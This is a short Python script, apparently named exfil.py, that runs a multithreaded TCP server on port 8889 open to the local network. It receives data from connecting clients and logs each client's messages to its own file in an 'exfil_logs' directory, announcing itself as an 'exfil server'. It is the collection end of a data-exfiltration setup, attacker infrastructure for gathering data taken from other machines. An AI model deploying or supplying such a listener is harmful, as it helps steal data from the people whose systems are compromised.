# exfil.py
import socket
import threading
import datetime
import os

host = '0.0.0.0' # Open to anyone on the same wifi, i think more than this requires port forwarding
port = 8889
LOG_DIR = 'exfil_logs'

# Create log directory if it doesn't exist
if not os.path.exists(LOG_DIR):
    os.makedirs(LOG_DIR)

# convert from a bytes object to plain text
def decrypt(b):
    return b.decode().replace('\\n', '\n');

def receiveMessage(a, c):
   # Generate a unique filename for this client
   client_ip, client_port = a
   log_file = os.path.join(LOG_DIR, f"exfil_{client_ip}_{client_port}.log")

   with c:
        print(f"Connected to {a}, logging to {log_file}")
        while True:
            data = c.recv(1024)
            if not data:
                print(f"Disconnected from {a}")
                break

            try:
                response = decrypt(data);
            except Exception as e:
                print(f"[!] Error decoding response from {a}: {e}")
                break

            print(f"Received message from {a}")
            
            # Log the message to the client's specific file
            with open(log_file, 'a') as f:
                timestamp = datetime.datetime.now().strftime('%Y-%m-%d %H:%M:%S')
                f.write(f"--- Log entry at {timestamp} ---\n")
                f.write(response)
                f.write("\n\n")
    


# Set up a socket and listen for a connection
with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
    s.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
    s.bind((host, port))
    s.listen()
    print(f"Starting the exfil server..")
    print(f"Listening on {host}:{port}")

    while True:
        c, a = s.accept()
        threading.Thread(target=receiveMessage, args=(a, c,), daemon=True).start()
           
s.close()